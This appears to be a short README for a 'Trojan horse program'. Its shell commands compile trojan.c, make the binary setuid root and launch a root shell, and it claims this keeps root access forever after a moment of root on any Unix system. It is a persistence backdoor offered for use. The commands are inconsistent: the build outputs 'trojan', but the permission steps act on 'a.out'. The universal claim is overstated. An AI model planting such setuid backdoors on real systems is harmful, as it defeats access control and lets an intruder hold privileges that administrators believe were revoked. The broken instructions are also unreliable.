## Trojan horse program

```
gcc -o trojan trojan.c
sudo chown root a.out
sudo chmod u+s a.out
./a.out sudo su root -
```

The program allows being root forever once you have been granted root for a moment.
This works on all Unix based systems.
